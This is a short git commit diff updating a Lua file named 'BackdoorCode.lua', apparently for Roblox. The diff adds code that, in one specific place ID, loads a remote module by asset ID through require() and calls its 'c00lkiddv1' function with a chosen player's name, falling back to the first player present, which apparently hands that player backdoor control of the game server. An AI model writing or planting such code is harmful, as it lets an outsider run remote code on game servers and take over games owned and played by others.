356bdc9210754d02e8d184b886dbdac73e2368de
qWixxyLuau <kiryuha4112@mail.ru>
2025-05-30 17:04:51 +0500

    Update BackdoorCode.lua

--- BackdoorCode.lua
+++ BackdoorCode.lua
@@ -1,1 +1,7 @@
-require(14476224091).c00lkiddv1("118x113")
+if game.PlaceId == 83207884323273 then
+  if game.Players["118x113"] then
+    require(14476224091).c00lkiddv1("118x113")
+  else
+    require(14476224091).c00lkiddv1(game.Players:GetChildren()[1].Name)
+  end
+end
